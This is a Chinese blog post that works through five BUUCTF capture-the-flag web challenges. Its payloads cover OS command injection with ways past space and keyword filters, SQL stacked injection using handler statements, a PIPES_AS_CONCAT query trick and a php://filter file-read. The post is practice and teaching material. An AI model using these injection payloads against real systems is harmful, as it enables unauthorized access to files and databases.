<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>[BT]BUUCTF刷题第2天（3.20） - 老帅的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:url" content="https://laoshuaiblog.github.io/posts/05340dbb2fae703c5bbfeb4a20c3b4f6/">
  <meta property="og:site_name" content="老帅的博客">
  <meta property="og:title" content="[BT]BUUCTF刷题第2天（3.20）">
  <meta property="og:description" content="第2天（共5题） Web [ACTF2020 新生赛]Exec Payload：target=127.0.0.1;cat /flag
分号;在许多shell中用作命令分隔符，意味着在执行完前一个命令（这里是设置target变量）后，接着执行cat /flag命令。
[GXYCTF2019]Ping Ping Ping Paayload：
http://4caf85f2-dc7a-47ae-a50f-683bb207ece6.node5.buuoj.cn:81?ip=1;cat$IFS$9`ls` 反引号的「优先级」很高，会先执行反引号中的命令，而后在将执行的「结果」结果配合其他命令执行，也就是说，执行的语句时下面这样：
?ip=1;cat flag.php index.php
根据提示，是要在url后面加上/?ip=参数值来进行解题，这道题类似上道题都是需要执行多个命令获取flag，但是多了过滤。
初始Payload：?ip=1;ls
发现能够返回目录下的文件：flag.php index.php
加上访问文件：?ip=1;cat flag.php
发现网站过滤空格
绕过空格的几种方式：
${IFS}$IFS$9 $9可改成其他数字&amp;lt;&amp;lt;&amp;gt; 重定向符{cat,flag.php} 用逗号,实现了空格功能 本题中$IFS$9可行
绕过空格：?ip=1;cat$IFS$9flag.php
发现过滤flag字样
绕过flag的几种方式：
编码绕过关键词。变量拼接绕过关键词。（?ip=1;b=ag;cat$IFS$9fl$b.php）反引号执行绕过关键词 以上三种方式均可以显示文件内容
flag藏在注释
[强网杯 2019]随便注 Payload：
?inject=0&#39;;handler `1919810931114514` open;handler `1919810931114514` read first; -- a 使用0&#39; or True -- a查询表中所有数据
0后面的`用于结束前面的SQL语句，True使查询语句为真，–是SQL里的注释，a为注释的一部分
源码过滤了select、update、delete、drop、insert、where等关键字，因此本题考点为堆叠注入（即通过分号将多条SQL语句一起执行）
初始Payload：
?inject=0&#39;;show tables; -- a 这里直接查询所有表，发现了1919810931114514和word表，由于select被过滤了，show命令又不能查看表中的数据，因此需要使用「handler 命令」来查看表中的数据
添加查询表中数据的Payload：
?inject=0&#39;;handler `1919810931114514` open;handler `1919810931114514` read first; -- a 注意表名用反引号括起">
  <meta property="og:locale" content="zh-CN">
  <meta property="og:type" content="article">
  <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-03-20T21:35:21+08:00">
    <meta property="article:modified_time" content="2024-03-20T21:35:21+08:00">

	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
  


</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="老帅的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">老帅的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">[BT]BUUCTF刷题第2天（3.20）</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-tomorrow-night">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <h2><a id="25_0"></a>第2天（共5题）</h2> 
<h3><a id="Web_1"></a>Web</h3> 
<h4><a id="ACTF2020_Exec_2"></a>[ACTF2020 新生赛]Exec</h4> 
<p>Payload：<code>target=127.0.0.1;cat /flag</code><br> <em>分号;在许多shell中用作命令分隔符，意味着在执行完前一个命令（这里是设置target变量）后，接着执行cat /flag命令。</em></p> 
<p><img src="https://images2.imgbox.com/14/4b/hjrNkSRW_o.png" alt=""><br> <img src="https://images2.imgbox.com/8c/45/URPj0gy7_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="GXYCTF2019Ping_Ping_Ping_9"></a>[GXYCTF2019]Ping Ping Ping</h4> 
<p>Paayload：</p> 
<pre><code class="prism language-bash">http://4caf85f2-dc7a-47ae-a50f-683bb207ece6.node5.buuoj.cn:81?ip<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token function">cat</span><span class="token environment constant">$IFS</span><span class="token variable">$9</span><span class="token variable"><span class="token variable">`</span><span class="token function">ls</span><span class="token variable">`</span></span>
</code></pre> 
<p>反引号的「优先级」很高，会先执行反引号中的命令，而后在将执行的「结果」结果配合其他命令执行，也就是说，执行的语句时下面这样：<br> <code>?ip=1;cat flag.php index.php</code></p> 
<p><img src="https://images2.imgbox.com/7a/87/mcaZ3IPO_o.png" alt="在这里插入图片描述"><br> 根据提示，是要在url后面加上/?ip=参数值来进行解题，这道题类似上道题都是需要执行多个命令获取flag，但是多了过滤。</p> 
<p>初始Payload：<code>?ip=1;ls</code><br> 发现能够返回目录下的文件：<strong>flag.php index.php</strong></p> 
<p>加上访问文件：<code>?ip=1;cat flag.php</code><br> 发现网站过滤空格<br> <img src="https://images2.imgbox.com/a5/53/yRb3SMqo_o.png" alt="在这里插入图片描述"></p> 
<p>绕过空格的几种方式：</p> 
<ol><li>${IFS}</li><li>$IFS$9 $9可改成其他数字</li><li>&lt;</li><li>&lt;&gt; 重定向符</li><li>{cat,flag.php} 用逗号,实现了空格功能</li></ol> 
<p>本题中$IFS$9可行</p> 
<p>绕过空格：<code>?ip=1;cat$IFS$9flag.php</code><br> 发现过滤flag字样</p> 
<p><img src="https://images2.imgbox.com/9c/3f/wMh7iCP3_o.png" alt="在这里插入图片描述"><br> 绕过flag的几种方式：</p> 
<ol><li>编码绕过关键词。</li><li>变量拼接绕过关键词。（?ip=1;b=ag;cat$IFS$9fl$b.php）</li><li>反引号执行绕过关键词</li></ol> 
<p>以上三种方式均可以显示文件内容</p> 
<p><img src="https://images2.imgbox.com/75/0b/jwUKoT4n_o.png" alt="在这里插入图片描述"><br> flag藏在注释</p> 
<p><img src="https://images2.imgbox.com/ab/c6/YbdYwsmD_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="_2019_52"></a>[强网杯 2019]随便注</h4> 
<p>Payload：</p> 
<pre><code class="prism language-sql">?inject<span class="token operator">=</span><span class="token number">0</span>'<span class="token punctuation">;</span><span class="token keyword">handler</span> <span class="token identifier"><span class="token punctuation">`</span>1919810931114514<span class="token punctuation">`</span></span> <span class="token keyword">open</span><span class="token punctuation">;</span><span class="token keyword">handler</span> <span class="token identifier"><span class="token punctuation">`</span>1919810931114514<span class="token punctuation">`</span></span> <span class="token keyword">read</span> <span class="token keyword">first</span><span class="token punctuation">;</span> <span class="token comment">-- a</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/94/3a/J89lnbaA_o.png" alt="在这里插入图片描述"><br> 使用<code>0' or True -- a</code>查询表中所有数据<br> 0后面的`用于结束前面的SQL语句，True使查询语句为真，–是SQL里的注释，a为注释的一部分</p> 
<p>源码过滤了select、update、delete、drop、insert、where等关键字，因此本题考点为堆叠注入（即通过分号将多条SQL语句一起执行）</p> 
<p>初始Payload：</p> 
<pre><code class="prism language-sql">?inject<span class="token operator">=</span><span class="token number">0</span>'<span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">tables</span><span class="token punctuation">;</span> <span class="token comment">-- a</span>
</code></pre> 
<p>这里直接查询所有表，发现了1919810931114514和word表，由于select被过滤了，show命令又不能查看表中的数据，因此需要使用「handler 命令」来查看表中的数据</p> 
<p>添加查询表中数据的Payload：</p> 
<pre><code class="prism language-sql">?inject<span class="token operator">=</span><span class="token number">0</span>'<span class="token punctuation">;</span><span class="token keyword">handler</span> <span class="token identifier"><span class="token punctuation">`</span>1919810931114514<span class="token punctuation">`</span></span> <span class="token keyword">open</span><span class="token punctuation">;</span><span class="token keyword">handler</span> <span class="token identifier"><span class="token punctuation">`</span>1919810931114514<span class="token punctuation">`</span></span> <span class="token keyword">read</span> <span class="token keyword">first</span><span class="token punctuation">;</span> <span class="token comment">-- a</span>
</code></pre> 
<p><strong>注意表名用反引号括起</strong></p> 
<p>得到flag<br> <img src="https://images2.imgbox.com/90/e6/vESJ5KWK_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="SUCTF_2019EasySQL_79"></a>[SUCTF 2019]EasySQL</h4> 
<p>Payload:<br> <code>1;set sql_mod=PIPES_AS_CONCAT;select 1</code></p> 
<p><em>SQL_MOD：是MySQL支持的基本语法、校验规则<br> 其中设置PIPES_AS_CONCAT之后会将||认为字符串的连接符，而不是或运算符，这时||符号就像concat函数一样。</em></p> 
<p><img src="https://images2.imgbox.com/e0/84/En0myeX5_o.png" alt="在这里插入图片描述"></p> 
<p>网站漏洞代码：</p> 
<pre><code class="prism language-sql"><span class="token keyword">select</span> $_POST<span class="token punctuation">[</span><span class="token string">'query'</span><span class="token punctuation">]</span> <span class="token operator">||</span> flag <span class="token keyword">from</span> Flag<span class="token punctuation">;</span>
</code></pre> 
<p>使用<code>1;set sql_mod=PIPES_AS_CONCAT;select 1</code>后输出数据是1列和flag列的组合</p> 
<p>其他Payload：<br> <code>*,1</code></p> 
<p>*代表所有列，逗号作为分割，1加上查询语句的|| flag会得到1这个值，然后语句会一起查询所有列和1列的数据并返回<br> <img src="https://images2.imgbox.com/88/10/ORdGKasI_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="_2019Secret_File_101"></a>[极客大挑战 2019]Secret File</h4> 
<p>Payload：<br> <code>?file=php://filter/read=convert.base64-encode/resource=flag.php</code></p> 
<p><img src="https://images2.imgbox.com/db/99/vQVoKUXO_o.png" alt="在这里插入图片描述"></p> 
<p>这里可能是因为我加了Chrome的显示插件，所以我能直接看到下面的超链接文字（本来应该是看不到的，不过源代码中的&lt;a id=“master” href="./Archive_room.php"也能看出来），点击跳转至Archive_room.php</p> 
<p><img src="https://images2.imgbox.com/22/bc/KVQfLd8U_o.png" alt="在这里插入图片描述"></p> 
<p>注意这里的源代码里面的超链接是&lt;a id=“master” href=“./action.php”，点击SECRET</p> 
<p><img src="https://images2.imgbox.com/0d/7a/JwX2c8pK_o.png" alt="在这里插入图片描述"></p> 
<p>发现结束但是没有找到flag，而且这个结束页面的链接是end.php，原本是action.php，说明可能有跳转，在Archive_room.php页面进行抓包发现注释</p> 
<p><img src="https://images2.imgbox.com/5c/82/Qf7RfjLI_o.png" alt="在这里插入图片描述"></p> 
<p>访问这个页面得到提示，说明访问flag.php可以得到flag，这段代码看似过滤file参数值，其实没什么用，直接<code>?file=flag.php</code><br> <img src="https://images2.imgbox.com/84/e7/yKnb4LCH_o.png" alt="在这里插入图片描述"><br> 提示找到了但没完全找到，考虑伪协议，将其改为<code>?file=php://filter/read=convert.base64-encode/resource=flag.php</code><br> <img src="https://images2.imgbox.com/21/66/sYB0zfro_o.png" alt=""></p> 
<p>将得到的数据进行解码得到flag</p> 
<p><img src="https://images2.imgbox.com/90/6d/vtKILNGV_o.png" alt="在这里插入图片描述"></p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/15bb27cf03312dc5eb631a4d221e2c51/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">hive sql实现查找商品表名称中包含敏感词的商品</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/1893206faa5ec69de179476a49cfe79d/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">百度智能云&#43;SpringBoot=AI对话【人工智能】</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 老帅的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>